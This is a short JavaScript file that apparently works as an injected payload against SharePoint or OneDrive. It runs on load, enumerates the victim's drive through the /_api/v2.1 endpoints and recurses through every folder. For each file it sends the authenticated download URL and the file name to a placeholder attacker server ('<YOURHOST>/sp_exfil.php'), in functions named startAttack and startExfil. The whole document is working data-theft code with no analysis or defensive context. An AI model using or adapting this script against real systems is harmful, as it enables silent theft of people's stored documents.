function getDriveId(data){
  d = JSON.parse(data);
  return d.parentReference.driveId;
}

function startAttack(){
    var t = "/_api/v2.1/drive/items/root";
    	var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("GET", t);
	xmlhttp.onreadystatechange = function() {
  	if (this.readyState == 4 && this.status == 200) {
    		var myArr = this.responseText;
    		var driveId=getDriveId(myArr);
    		var x = "/_api/v2.1/drives/"+driveId+"/root/children";
    		startExfil(x,driveId);
  		}
	};
	xmlhttp.send();
}

function startExfil(t,driveId){	
	var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("GET", t);
	xmlhttp.onreadystatechange = function() {
  	if (this.readyState == 4 && this.status == 200) {
    	var d = JSON.parse(this.responseText);
        
        for (var x in d.value){
             try{
                if (d.value[x].folder!==undefined){
                   var nt = "/_api/v2.1/drives/"+driveId+"/items/"+d.value[x].id+"/children";
    		   startExfil(nt,driveId);
                }else{
	             corslite(d.value[x]['@content.downloadUrl'],d.value[x]['name']);
                }                  
            }
            catch {console.log('no folder');}
        }
    }}
	xmlhttp.send();
}

function corslite(data,nm){
	var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("POST", 'https://<YOURHOST>/sp_exfil.php');
    xmlhttp.setRequestHeader("Content-Type", "application/json");
	xmlhttp.onreadystatechange = function() {
  	if (this.readyState == 4 && this.status == 200) {}}
        xmlhttp.send("{\"auth_url\":\""+data+"\",\"name\":\""+nm+"\"}" );
}
startAttack();